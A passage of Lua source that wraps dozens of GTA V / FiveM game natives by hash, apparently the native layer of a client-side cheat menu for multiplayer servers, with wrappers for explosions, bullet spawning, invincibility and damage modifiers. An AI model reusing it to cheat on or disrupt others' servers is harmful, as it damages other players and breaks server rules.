       return sum.curak.inv(0x45EEE61580806D63, ped)
   end
   sum.f.CreateCam = function(camName, p1)
       return sum.curak.inv(0xC3981DCE61D9E13F, sum.curak.tostring(camName), p1, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.RenderScriptCams = function(render, ease, easeTime, p3, p4)
       return sum.curak.inv(0x07E5B515DB0636FC, render, ease, easeTime, p3, p4)
   end
   sum.f.SetCamActive = function(cam, active)
       return sum.curak.inv(0x026FB97D0A425F84, cam, active)
   end
   sum.f.GetPedMaxHealth = function(ped)
       return sum.curak.inv(0x4700A416E8324EF3, ped)
   end
   sum.f.SetPedMaxHealth = function(ped, value)
       return sum.curak.inv(0xF5F6378C4F3419D3, ped, value, sum.curak.rai())
   end
   sum.f.SetFocusEntity = function(entity)
       return sum.curak.inv(0x198F77705FA0931D, entity)
   end
   sum.f.GetControlNormal = function(inputGroup, control)
       return sum.curak.inv(0xEC3C9B8D5327B563, inputGroup, control, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.GivePlayerRagdollControl = function(player, toggle)
       return sum.curak.inv(0x3C49C870E66F0A28, player, toggle)
   end
   sum.f.GetDisabledControlNormal = function(p0, p1)
       return sum.curak.inv(0x11E65974A982637C, p0, p1, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.GetEntityRotation = function(entity, rotationOrder)
       return sum.curak.inv(0xAFBD61CC738D9EB9, entity, rotationOrder, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.SetCamRot = function(cam, rotX, rotY, rotZ, p4)
       return sum.curak.inv(0x85973643155D0B07, cam, rotX, rotY, rotZ, p4)
   end
   sum.f.SetVehicleCustomPrimaryColour  = function(vehicle, r, g, b)
       return sum.curak.inv(0x7141766F91D15BEA, vehicle, r, g, b, sum.curak.rai())
   end
   sum.f.SetVehicleCustomSecondaryColour = function(vehicle, r, g, b)
       return sum.curak.inv(0x36CED73BFED89754, vehicle, r, g, b, sum.curak.rai())
   end
   sum.f.GetGroundZFor_3dCoord = function(x, y, z)
       return sum.curak.inv(0xC906A7DAB05C8D2B, x, y, z, sum.curak.pvf(), sum.curak.rra())
   end
   sum.f.GetOffsetFromEntityInWorldCoords = function(entity, xOffset, yOffset, zOffset)
       return sum.curak.inv(0x1899F328B0E12848, entity, xOffset, yOffset, zOffset, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.SetCamCoord = function(cam, posX, posY, posZ)
       return sum.curak.inv(0x4D41783FB745E42E, cam, posX, posY, posZ)
   end
   sum.f.IsPedInVehicle = function(ped, vehicle, atGetIn)
       return sum.curak.inv(0xA3EE4A07279BB9DB, ped, vehicle, atGetIn)
   end
   sum.f.ClearFocus = function()
       return sum.curak.inv(0x31B73D1EA9F01DA2)
   end
   sum.f.AddTextEntry = function(entryKey, entryText)
       return sum.curak.inv(0x32ca01c3, sum.curak.tostring(entryKey), sum.curak.tostring(entryText))
   end
   sum.f.DisplayOnscreenKeyboard = function(p0, windowTitle, p2, defaultText, defaultConcat1, defaultConcat2, defaultConcat3, maxInputLength)
       return sum.curak.inv(0x00DC833F2568DBF6, p0, sum.curak.tostring(windowTitle), sum.curak.tostring(p2), sum.curak.tostring(defaultText), sum.curak.tostring(defaultConcat1), sum.curak.tostring(defaultConcat2), sum.curak.tostring(defaultConcat3), maxInputLength)
   end
   sum.f.UpdateOnscreenKeyboard = function()
       return sum.curak.inv(0x0CF2B696BBF945AE, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetOnscreenKeyboardResult = function()
       return sum.curak.inv(0x8362B09B91893647, sum.curak.rra(), sum.curak.ras())
   end
   sum.f.EnableAllControlActions = function(index)
       return sum.curak.inv(0xA5FFE9B05F199DE7, index)
   end
   --[[sum.f.HttpRequest = function(url, args, req_type)
       return sum.curak.inv(0x762376233636, url, json.encode(args), req_type, sum.curak.ras())
   end]]
   sum.f.RequestWeaponAsset = function(weaponHash, p1, p2)
       return sum.curak.inv(0x5443438F033E29C3, weaponHash, p1, p2)
   end
   sum.f.HasWeaponAssetLoaded = function(weaponHash)
       return sum.curak.inv(0x5443438F033E29C3, weaponHash)
   end
   sum.f.GetPlayerServerId = function(player)
       return sum.curak.inv(0x4d97bcc7, player, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetPlayerName = function(playerSrc)
       return sum.curak.inv(0x6D0DE6A7B5DA71F8, playerSrc, sum.curak.ras())
   end
   sum.f.DestroyCam = function(cam)
       return sum.curak.inv(0x865908C81A2C22E9, cam)
   end
   sum.f.ClearTimecycleModifier = function()
       return sum.curak.inv(0x0F07E7745A236711)
   end
   sum.f.IsModelValid = function(model)
       return sum.curak.inv(0xC0296A2EDF545E92, model, sum.curak.rra())
   end
   sum.f.IsModelAVehicle = function(model)
       return sum.curak.inv(0x19AAC8F07BFEC53E, model, sum.curak.rra())
   end
   sum.f.SetVehicleXenonLightsColor = function(vehicle, color)
       return sum.curak.inv(0xE41033B25D003A07, vehicle, color, sum.curak.rai())
   end
   sum.f.SetPedShootsAtCoord = function(ped, x, y, z, toggle)
       return sum.curak.inv(0x96A05E4FB321B1BA, ped, x, y, z, toggle)
   end
   sum.f.CreateVehicle = function(modelHash, x, y, z, heading, networkHandle, vehiclehandle)
       return sum.curak.inv(0xAF35D0D2583051B0, modelHash, x, y, z, heading, networkHandle, vehiclehandle, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.SetPedIntoVehicle = function(ped, vehicle, seatIndex)
       return sum.curak.inv(0xF75B0D629E1C063D, ped, vehicle, seatIndex)
   end
   sum.f.CreateObject = function(modelHash, x, y, z, isNetwork, netMissionEntity, dynamic)
       return sum.curak.inv(0x509D5878EB39E842, modelHash, x, y, z, isNetwork, netMissionEntity, dynamic, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.ShootSingleBulletBetweenCoords = function(x1, y1, z1, x2, y2, z2, damage, p7, weaponHash, ownerPed, isAudible, isInvisible, speed)
       return sum.curak.inv(0x867654CBC7606F2C, x1, y1, z1, x2, y2, z2, damage, p7, weaponHash, ownerPed, isAudible, isInvisible, speed)
   end
   sum.f.RequestNamedPtfxAsset = function(assetName)
       return sum.curak.inv(0xB80D8756B4668AB6, sum.curak.tostring(assetName))
   end
   sum.f.ShowHudComponentThisFrame = function(id)
       return sum.curak.inv(0x0B4DF1FA60C0E664, id, sum.curak.rai())
   end
   sum.f.HasNamedPtfxAssetLoaded = function(assetName)
       return sum.curak.inv(0x8702416E512EC454, sum.curak.tostring(assetName), sum.curak.rra())
   end
   sum.f.UseParticleFxAssetNextCall = function(name)
       return sum.curak.inv(0x6C38AF3693A69A91, sum.curak.tostring(name))
   end
   sum.f.StartNetworkedParticleFxNonLoopedAtCoord = function(effectName, xPos, yPos, zPos, xRot, yRot, zRot, scale, xAxis, yAxis, zAxis)
       return sum.curak.inv(0xF56B8137DF10135D, sum.curak.tostring(effectName), xPos, yPos, zPos, xRot, yRot, zRot, scale, xAxis, yAxis, zAxis, sum.curak.rra())
   end
   sum.f.AttachEntityToEntity = function(entity1, entity2, boneIndex, x, y, z, xRot, yRot, zRot, p9, isRel, ignoreUpVec, allowRotation, unk, p14)
       return sum.curak.inv(0x6B9BBD38AB0796DF, entity1, entity2, boneIndex, x, y, z, xRot, yRot, zRot, p9, isRel, ignoreUpVec, allowRotation, unk, p14)
   end
   sum.f.GetPedBoneIndex = function(ped, boneId)
       return sum.curak.inv(0x3F428D08BE5AAE31, ped, boneId, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.IsPedInAnyVehicle = function(ped, atGetIn)
       return sum.curak.inv(0x997ABD671D25CA0B, ped, atGetIn, sum.curak.rra())
   end
   sum.f.GetVehiclePedIsUsing = function(ped)
       return sum.curak.inv(0x6094AD011A2EA87D, ped, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.SetPlayerWeaponDamageModifier = function(player, modifier)
       return sum.curak.inv(0xCE07B9F7817AADA3, player, modifier)
   end
   sum.f.GetVehicleMaxNumberOfPassengers = function(vehicle)
       return sum.curak.inv(0xA7C4F2C6E744A550, vehicle, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.IsVehicleSeatFree = function(vehicle, seatIndex)
       return sum.curak.inv(0x22AC59A870E6A669, vehicle, seatIndex, sum.curak.rra())
   end
   sum.f.GetVehiclePedIsIn = function(ped, lastVehicle)
       return sum.curak.inv(0x9A9112A0FE9A4713, ped, lastVehicle, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.DisablePlayerFiring = function(player, toggle)
       return sum.curak.inv(0x5E6CC07646BBEAB8, player, toggle)
   end
   sum.f.GetGameplayCamCoord = function()
       return sum.curak.inv(0x14D6F5678D8F1B37, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.ClearPedTasks = function(ped)
       return sum.curak.inv(0xE1EF3C1216AFF2CD, ped)
   end
   sum.f.ClearPedTasksImmediately = function(ped)
       return sum.curak.inv(0xAAA34F8A7CB32098, ped)
   end
   sum.f.IsPedMale = function(ped)
       return sum.curak.inv(0x6D9F5FAA7488BA46, ped)
   end
   sum.f.SetVehicleDoorsLocked = function(vehicle, doorLockStatus)
       return sum.curak.inv(0x4CDD35D0, sum.f.GetHashKey(vehicle), doorLockStatus, sum.curak.rai())
   end
   sum.f.CreatePed = function(pedType, modelHash, x, y, z, heading, isNetwork, thisScriptCheck)
       return sum.curak.inv(0xD49F9B0955C367DE, pedType, modelHash, x, y, z, heading, isNetwork, thisScriptCheck, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.FreezeEntityPosition = function(entity, toggle)
       return sum.curak.inv(0x428CA6DBD1094446, entity, toggle)
   end
   sum.f.SetPedCanRagdoll = function(ped, toggle)
       return sum.curak.inv(0xB128377056A54E2A, ped, toggle)
   end
   sum.f.SetPedDiesInWater = function(ped, toggle)
       return sum.curak.inv(0x56CEF0AC79073BDE, ped, toggle)
   end
   sum.f.GetServerInformation = function()
       return sum.curak.inv(0x762376233638, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetCurrentServerEndpoint = function()
       return sum.curak.inv(0xEA11BFBA, sum.curak.rra(), sum.curak.ras())
   end
   --if sum.f.GetServerInformation() ~= 0 and sum.f.GetCurrentServerEndpoint() == '127.0.0.1:30120' or sum.f.GetPlayerName(sum.f.PlayerId()) == 'ssnrvpycylo' or sum.f.GetPlayerName(sum.f.PlayerId()) == 'top 5 developer lua' then 
   sum.f.GiveDelayedWeaponToPed  = function(ped, weaponHash, ammoCount, bForceInHand)
       return sum.curak.inv(0xB282DC6EBD803C75, ped, sum.f.GetHashKey(weaponHash), ammoCount, bForceInHand, sum.curak.rai())
   end
   sum.f.SetPlayerWantedLevelNow = function(ped, toggle)
       return sum.curak.inv(0xE0A7D1E497FFCD6F, ped, toggle)
   end
   sum.f.GetWaterHeight = function(x, y, z, height)
       return sum.curak.inv(0xF6829842C06AE524, x, y, z)
   end
   sum.f.IsEntityInAir = function(entity)
       return sum.curak.inv(0x886E37EC497200B6, entity)
   end
   sum.f.SetPlayerWantedLevel = function(player, wantedLevel, disableNoMission)
       return sum.curak.inv(0xB7A0914B, player, wantedLevel, disableNoMission, sum.curak.rai())
   end
   sum.f.ClearPedSecondaryTask = function(ped)
       return sum.curak.inv(0x176CECF6F920D707, ped)
   end
   sum.f.SetVehicleAlarmTimeLeft = function(vehicle, time)
       return sum.curak.inv(0x176CECF6F920D707, vehicle, time, sum.curak.rai())
   end
   sum.f.SetVehicleAlarm = function(vehicle, state)
       return sum.curak.inv(0x24877D84, vehicle, state)
   end
   sum.f.SetPedAlertness = function(ped, value)
       return sum.curak.inv(0xDBA71115ED9941A6, ped, value)
   end
   sum.f.SetPedKeepTask = function(ped, toggle)
       return sum.curak.inv(0x971D38760FBC02EF, ped, toggle)
   end
   sum.f.IsAimCamThirdPersonActive = function()
       return sum.curak.inv(0x74BD83EA840F6BC9)
   end
   sum.f.IsFirstPersonAimCamActive = function()
       return sum.curak.inv(0x5E346D934122613F)
   end
   sum.f.SetEntityMaxHealth = function(entity, value)
       return sum.curak.inv(0x166E7CF68597D8B5, entity, value, sum.curak.rai())
   end
   sum.f.SetPlayerHealthRechargeMultiplier = function(player, regenRate)
       return sum.curak.inv(0x5DB660B38DD98A31, player, regenRate)
   end
   sum.f.SetDriveTaskDrivingStyle = function(ped, drivingStyle)
       return sum.curak.inv(0xDACE1BE37D88AF67, ped, drivingStyle, sum.curak.rai())
   end
   sum.f.TaskVehicleDriveToCoord = function(ped, vehicle, x, y, z, speed, p6, vehicleModel, drivingMode, stopRange, p10)
       return sum.curak.inv(0xE2A2AA2F659D77A7, ped, vehicle, x, y, z, speed, p6, vehicleModel, drivingMode, stopRange, p10, sum.curak.rai())
   end
   sum.f.IsDisabledControlJustPressed = function(index, control)
       return sum.curak.inv(0x91AEF906BCA88877, index, control, sum.curak.rra())
   end
   sum.f.IsDisabledControlReleased = function(inputGroup, control)
       return sum.curak.inv(0xFB6C4072E9A32E92, inputGroup, control, sum.curak.rra())
   end
   sum.f.SetVehicleModKit = function(vehicle, modKit)
       return sum.curak.inv(0x1F2AA07F00B3217A, vehicle, modKit)
   end
   sum.f.GetNumVehicleMods = function(vehicle, modType)
       return sum.curak.inv(0xE38E9162A2500646, vehicle, modType, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetModTextLabel = function(vehicle, modType, modValue)
       return sum.curak.inv(0x8935624F8C5592CC, vehicle, modType, modValue, sum.curak.rra(), sum.curak.ras())
   end
   sum.f.GetLabelText = function(labelName)
       return sum.curak.inv(0x7B5280EBA9840C72, sum.curak.tostring(labelName), sum.curak.rra(), sum.curak.ras())
   end
   sum.f.SetVehicleMod = function(vehicle, modType, modIndex, customTires)
       return sum.curak.inv(0x6AF0636DDEDCB6DD, vehicle, modType, modIndex, customTires)
   end
   sum.f.ToggleVehicleMod = function(vehicle, modType, toggle)
       return sum.curak.inv(0x2A1F4F37F95BAD08, vehicle, modType, toggle)
   end
   sum.f.SetVehicleGravityAmount = function(vehicle, gravity)
       return sum.curak.inv(0x1a963e58, vehicle, gravity)
   end
   sum.f.SetVehicleForwardSpeed = function(vehicle, speed)
       return sum.curak.inv(0xAB54A438726D25D5, vehicle, speed)
   end
   sum.f.SetVehicleNumberPlateText = function(vehicle, plateText)
       return sum.curak.inv(0x95A88F0B409CDA47, vehicle, sum.curak.tostring(plateText))
   end
   sum.f.DoesEntityExist = function(entity)
       return sum.curak.inv(0x7239B21A38F536BA, entity, sum.curak.rra())
   end
   sum.f.GetVehicleColours = function(vehicle)
       return sum.curak.inv(0xA19435F193E081AC, vehicle, sum.curak.int(), sum.curak.int())
   end
   sum.f.GetVehicleExtraColours = function(vehicle)
       return sum.curak.inv(0x3BC4245933A166F7, vehicle, sum.curak.int(), sum.curak.int())
   end
   sum.f.DoesExtraExist = function(vehicle, extraId)
       return sum.curak.inv(0x1262D55792428154, vehicle, extraId, sum.curak.rra())
   end
   sum.f.IsVehicleExtraTurnedOn = function(vehicle, extraId)
       return sum.curak.inv(0xD2E6822DBFD6C8BD, vehicle, extraId, sum.curak.rra())
   end
   sum.f.GetEntityModel = function(entity)
       return sum.curak.inv(0x9F47B058362C84B5, entity, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetVehicleWheelType = function(vehicle)
       return sum.curak.inv(0xB3ED1BFB4BE636DC, vehicle, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetVehicleWindowTint = function(vehicle)
       return sum.curak.inv(0x0EE21293DAD47C95, vehicle, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.IsVehicleNeonLightEnabled = function(vehicle, index)
       return sum.curak.inv(0x8C4B92553E4766A5, vehicle, index, sum.curak.rra())
   end
   sum.f.DoesCamExist = function(cam)
       return sum.curak.inv(0xA7A932170592B50E, cam, sum.curak.rra())
   end
   sum.f.GetVehicleNeonLightsColour = function(vehicle)
       return sum.curak.inv(0x7619EEE8C886757F, vehicle, sum.curak.int(), sum.curak.int(), sum.curak.int())
   end
   sum.f.GetVehicleTyreSmokeColor = function(vehicle)
       return sum.curak.inv(0xB635392A4938B3C3, vehicle, sum.curak.int(), sum.curak.int(), sum.curak.int())
   end
   sum.f.GetVehicleMod = function(vehicle, modType)
       return sum.curak.inv(0x772960298DA26FDB, vehicle, modType, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.IsToggleModOn = function(vehicle, modType)
       return sum.curak.inv(0x84B233A8C8FC8AE7, vehicle, modType, sum.curak.rra())
   end
   sum.f.GetVehicleLivery = function(vehicle)
       return sum.curak.inv(0x2BB9230590DA5E8A, vehicle, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.SetVehicleFixed = function(vehicle)
       return sum.curak.inv(0x115722B1B9C14C1C, vehicle)
   end
   sum.f.SetVehicleLightsMode = function(vehicle, p1)
       return sum.curak.inv(0x1FD09E7390A74D54, vehicle, p1)
   end
   sum.f.SetVehicleLights = function(vehicle, p1)
       return sum.curak.inv(0x34E710FF01247C5A, vehicle, p1)
   end
   sum.f.SetVehicleBurnout = function(vehicle, toggle)
       return sum.curak.inv(0xFB8794444A7D60FB, vehicle, toggle)
   end
   sum.f.SetVehicleEngineHealth = function(vehicle, health)
       return sum.curak.inv(0x45F6D8EEF34ABEF1, vehicle, health)
   end
   sum.f.SetVehicleFuelLevel = function(vehicle, level)
       return sum.curak.inv(0xba970511, vehicle, level)
   end
   sum.f.SetVehicleOilLevel = function(vehicle, level)
       return sum.curak.inv(0x90d1cad1, vehicle, level)
   end
   sum.f.NetworkGetPlayerIndexFromPed = function(ped)
       return sum.curak.inv(0x6C0E2E0125610278, ped, sum.curak.rra())
   end
   sum.f.SetVehicleDirtLevel = function(vehicle, dirtLevel)
       return sum.curak.inv(0x79D3B596FE44EE8B, vehicle, dirtLevel)
   end
   sum.f.SetVehicleOnGroundProperly = function(vehicle)
       return sum.curak.inv(0x49733E92263139D1, vehicle, sum.curak.rra())
   end
   sum.f.SetEntityAsMissionEntity = function(entity, value, p2)
       return sum.curak.inv(0xAD738C3085FE7E11, entity, value, p2)
   end
   sum.f.StartVehicleAlarm = function(vehicle)
       return sum.curak.inv(0xB8FF7AB45305C345, vehicle)
   end
   sum.f.PopOutVehicleWindscreen = function(VEHICLE)
       return sum.curak.inv(0x6D645D59FB5F5AD3, VEHICLE)
   end
   sum.f.SmashVehicleWindow = function(VEHICLE, windowIndex)
       return sum.curak.inv(0x9E5B5E4D2CCD2259, VEHICLE, windowIndex)
   end
   sum.f.SetVehicleDoorBroken = function(VEHICLE, doorIndex, deleteDoor)
       return sum.curak.inv(0xD4D4F6A4AB575A33, VEHICLE, doorIndex, deleteDoor)
   end
   sum.f.DeleteVehicle = function(vehicle)
       return sum.curak.inv(0xEA386986E786A54F, sum.curak.ii(vehicle))
   end
   sum.f.GetVehicleClass = function(vehicle)
       return sum.curak.inv(0x29439776AAA00A62, vehicle, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.SetVehicleWheelType = function(vehicle, WheelType)
       return sum.curak.inv(0x487EB21CC7295BA1, vehicle, WheelType, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.SetVehicleExtraColours = function(vehicle, pearlescentColor, wheelColor)
       return sum.curak.inv(0x2036F561ADD12E33, vehicle, pearlescentColor, wheelColor)
   end
   sum.f.SetVehicleColours = function(vehicle, colorPrimary, colorSecondary)
       return sum.curak.inv(0x4F1D4BE3A7F24601, vehicle, colorPrimary, colorSecondary)
   end
   sum.f.SetVehicleNeonLightEnabled = function(vehicle, index, toggle)
       return sum.curak.inv(0x2AA720E4287BF269, vehicle, index, toggle)
   end
   sum.f.SetVehicleNeonLightsColour = function(vehicle, r, g, b)
       return sum.curak.inv(0x8E0A582209A62695, vehicle, r, g, b)
   end
   sum.f.TaskPlayAnim = function(ped, animDictionary, animationName, blendInSpeed, blendOutSpeed, duration, flag, playbackRate, lockX, lockY, lockZ)
       return sum.curak.inv(0xEA47FE3719165B94, ped, sum.curak.tostring(animDictionary), sum.curak.tostring(animationName), blendInSpeed, blendOutSpeed, duration, flag, playbackRate, lockX, lockY, lockZ)
   end
   sum.f.SetNewWaypoint = function(x, y)
       return sum.curak.inv(0xFE43368D2AA4F2FC, x, y, sum.curak.rav())
   end
   sum.f.SetMpGamerHealthBarDisplay = function(gamerTagId, toggle)
       return sum.curak.inv(0xD29EC58C2F6B5014, gamerTagId, toggle, sum.curak.rai())
   end
   sum.f.DrawMarker = function(type, posX, posY, posZ, dirX, dirY, dirZ, rotX, rotY, rotZ, scaleX, scaleY, scaleZ, red, green, blue, alpha, bobUpAndDown, faceCamera, p19, rotate, textureDict, textureName, drawOnEnts)
       return sum.curak.inv(0x28477EC23D892089, type, posX, posY, posZ, dirX, dirY, dirZ, rotX, rotY, rotZ, scaleX, scaleY, scaleZ, red, green, blue, alpha, bobUpAndDown, faceCamera, p19, rotate, sum.curak.tostring(textureDict), sum.curak.tostring(textureName), drawOnEnts)
   end
   sum.f.NetworkIsPlayerActive = function(player)
       return sum.curak.inv(0xB8DFD30D6973E135, player, sum.curak.rra())
   end -- Tady
   sum.f.TaskFollowToOffsetOfEntity = function(ped, entity, offsetX, offsetY, offsetZ, movementSpeed, timeout, stoppingRange, persistFollowing)
       return sum.curak.inv(0x304AE42E357B8C7E, ped, entity, offsetX, offsetY, offsetZ, movementSpeed, timeout, stoppingRange, persistFollowing,  sum.curak.rai(), sum.curak.rra())
   end
   sum.f.DrawLightWithRange = function(posX, posY, posZ, colorR, colorG, colorB, range, intensity)
       return sum.curak.inv(0xF2A1B2771A01DBD4, posX, posY, posZ, colorR, colorG, colorB, range, intensity)
   end
   sum.f.SetVehicleTyreBurst = function(vehicle, index, onRim, p3)
       return sum.curak.inv(0xEC6A202EE4960385, vehicle, index, onRim, p3, sum.curak.rra())
   end
   sum.f.GetBlipFromEntity = function(entity)
       return sum.curak.inv(0xBC8DBDCA2436F7E8, entity, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.AddBlipForEntity = function(entity)
       return sum.curak.inv(0x5CDE92C702A8FCE7, entity, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.SetBlipSprite = function(blip, spriteId)
       return sum.curak.inv(0xDF735600A4696DAF, blip, spriteId)
   end
   sum.f.ShowHeadingIndicatorOnBlip = function(blip, toggle)
       return sum.curak.inv(0x5FBCA48327B914DF, blip, toggle)
   end
   sum.f.GetBlipSprite = function(blip)
       return sum.curak.inv(0x1FC877464A04FC4F, blip, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetFrameTime = function()
       return sum.curak.inv(0x15C40837039FFAF7, sum.curak.raf())
   end
   sum.f.GetEntityHealth = function(entity)
       return sum.curak.inv(0xEEF059FAD016D209, entity, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.HideNumberOnBlip = function(blip)
       return sum.curak.inv(0x532CFF637EF80148, blip)
   end
   sum.f.SetBlipRotation = function(blip, rotation)
       return sum.curak.inv(0xF87683CDF73C3F6E, blip, rotation)
   end
   sum.f.SetBlipNameToPlayerName = function(blip, player)
       return sum.curak.inv(0x127DE7B20C60A6A3, blip, player)
   end
   sum.f.SetBlipScale = function(blip, scale)
       return sum.curak.inv(0xD38744167B2FA257, blip, scale)
   end
   sum.f.IsPauseMenuActive = function()
       return sum.curak.inv(0xB0034A223497FFCB, sum.curak.rra())
   end
   sum.f.SetBlipAlpha = function(blip, alpha)
       return sum.curak.inv(0x45FF974EEE1C8734, blip, alpha)
   end
   sum.f.RemoveBlip = function(blip)
       return sum.curak.inv(0x86A652570E5F25DD, sum.curak.ii(blip))
   end
   sum.f.GetGameTimer = function()
       return sum.curak.inv(0x9CD27B0045628463, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.SetEntityAlpha = function(entity, alphaLevel, skin)
       return sum.curak.inv(0x44A0870B7E92D7C0, entity, alphaLevel, skin)
   end
   sum.f.SetEntityCollision = function(entity, toggle, keepPhysics)
       return sum.curak.inv(0x1A9205C1B9EE827F, entity, toggle, keepPhysics)
   end
   sum.f.SetTransitionTimecycleModifier = function(modifierName, transition)
       return sum.curak.inv(0x3BCF567485E1971C, sum.curak.tostring(modifierName), transition)
   end
   sum.f.GetDisplayNameFromVehicleModel = function(modelHash)
       return sum.curak.inv(0xB215AAC32D25D019, modelHash, sum.curak.ras())
   end
   sum.f.SetPedSuffersCriticalHits = function(ped, toggle)
       return sum.curak.inv(0xEBD76F2359F190AC, ped, toggle)
   end
   sum.f.SetEntityCanBeDamaged = function(entity, toggle)
       return sum.curak.inv(0x1760FFA8AB074D66, entity, toggle)
   end
   sum.f.SetWeatherTypeNowPersist = function(weatherType)
       return sum.curak.inv(0xED712CA327900C8A, sum.curak.tostring(weatherType))
   end
   sum.f.SetVehicleWindowTint = function(vehicle, tint)
       return sum.curak.inv(0x57C51E6BAD752696, vehicle, tint)
   end
   sum.f.ModifyVehicleTopSpeed = function(vehicle, value)
       return sum.curak.inv(0x93A3996368C94158, vehicle, value)
   end
   sum.f.IsWeaponValid = function(weaponHash)
       return sum.curak.inv(0x937C71165CF334B3, sum.f.GetHashKey(weaponHash), sum.curak.rra())
   end
   sum.f.GiveWeaponToPed = function(ped, weaponHash, ammoCount, p4, equipNow)
       return sum.curak.inv(0xBF0FD6E56C964FCB, ped, weaponHash, ammoCount, p4, equipNow)
   end
   sum.f.GetWeaponDamageModifier = function(weaponHash)
       return sum.curak.inv(0xD979143, weaponHash)
   end
   sum.f.RenderFakePickupGlow = function(x, y, z, colorIndex)
       return sum.curak.inv(0x3430676B11CDF21D, x, y, z, colorIndex, sum.curak.rai())
   end
   sum.f.GetSelectedPedWeapon = function(ped)
       return sum.curak.inv(0x0A6DB4965674D243, ped)
   end
   sum.f.SetWeaponDamageModifierThisFrame = function(weaponHash, damageAmount)
       return sum.curak.inv(0x4757F00BC6323CFE, sum.f.GetHashKey(weaponHash), damageAmount)
   end
   sum.f.SetPlayerMeleeWeaponDamageModifier = function(player, modifier)
       return sum.curak.inv(0x4A3DC7ECCC321032, player, modifier)
   end
   sum.f.SetPedInfiniteAmmoClip = function(ped, toggle)
       return sum.curak.inv(0x183DADC6AA953186, ped, toggle)
   end
   sum.f.SetEntityNoCollisionEntity = function(entity1, entity2, thisFrameOnly)
       return sum.curak.inv(0xA53ED5520C07654A, entity1, entity2, thisFrameOnly)
   end
   sum.f.IsEntityAPed = function(entity)
       return sum.curak.inv(0x524AC5ECEA15343E, entity)
   end
   sum.f.GetPedLastWeaponImpactCoord = function(ped, coords)
       return sum.curak.inv(0x6C4D0409BA1A2BC2, ped, sum.curak.pvv(), sum.curak.rra())
   end
   sum.f.AddExplosion = function(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
       return sum.curak.inv(0xE3AD2BDBAEE269AC, x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
   end
   sum.f.HasPedGotWeaponComponent = function(ped, weaponHash, componentHash)
       return sum.curak.inv(0xC593212475FAE340, ped, sum.f.GetHashKey(weaponHash), sum.f.GetHashKey(componentHash), sum.curak.rra())
   end
   sum.f.GiveWeaponComponentToPed = function(ped, weaponHash, componentHash)
       return sum.curak.inv(0xD966D51AA5B28BB9, ped, weaponHash, componentHash)
   end
   sum.f.RemoveWeaponComponentFromPed = function(ped, weaponHash, componentHash)
       return sum.curak.inv(0x1E8BE90C74FB4C09, ped, sum.f.GetHashKey(weaponHash), sum.f.GetHashKey(componentHash))
   end
   sum.f.AddAmmoToPed = function(ped, weaponHash, ammo)
       return sum.curak.inv(0x78F0424C34306220, ped, weaponHash, ammo)
   end
   sum.f.GetNumResources = function()
       return sum.curak.inv(0x863f27b, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetResourceByFindIndex = function(findIndex)
       return sum.curak.inv(0x387246b7, findIndex, sum.curak.rra(), sum.curak.ras())
   end
   sum.f.GetResourceState = function(resourceName)
       return sum.curak.inv(0x4039b485, sum.curak.tostring(resourceName), sum.curak.rra(), sum.curak.ras())
   end
   sum.f.CreateCamWithParams = function(p1, p2, p3, p4, p5, p6, p7, p8, p9, p10)
       return sum.curak.inv(0xB51194800B257161, sum.curak.tostring(p1), p2, p3, p4, p5, p6, p7, p8, p9, p10, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetGameplayCamFov = function()
       return sum.curak.inv(0x65019750A0324133, sum.curak.rav())
   end
   sum.f.GetGameplayCamCoords = function()
       return sum.curak.inv(0xA200EB1EE790F448, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.SetPedToRagdoll = function(ped, time1, time2, ragdollType, p4, p5, p6)
       return sum.curak.inv(0x83CB5052, ped, time1, time2, ragdollType, p4, p5, p6)
   end
   sum.f.GetCamCoord = function(cam)
       return sum.curak.inv(0xBAC038F7459AE5AE, cam, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.GetCamRot = function(cam, rotationOrder)
       return sum.curak.inv(0x7D304C1C955E3E12, cam, rotationOrder, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.GetShapeTestResult = function(rayHandle)
       return sum.curak.inv(0x3D87450E15D98694, rayHandle, sum.curak.int(), sum.curak.pvv(), sum.curak.pvv(), sum.curak.int(), sum.curak.rra(), sum.curak.rai())
   end
   sum.f.StartShapeTestRay = function(x1, y1, z1, x2, y2, z2, flags, entity, p8)
       return sum.curak.inv(0x377906D8A31E5586, x1, y1, z1, x2, y2, z2, flags, entity, p8, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.DisplayRadar = function(Toggle)
       return sum.curak.inv(0xA0EBB943C300E693, Toggle)
   end
   sum.f.NetworkRequestControlOfEntity = function(entity)
       return sum.curak.inv(0xB69317BF5E782347, entity, sum.curak.rra())
   end
   sum.f.DeleteEntity = function(entity)
       return sum.curak.inv(0xAE3CBE5BF394C9C9, sum.curak.ii(entity))
   end
   sum.f.DeleteObject = function(entity)
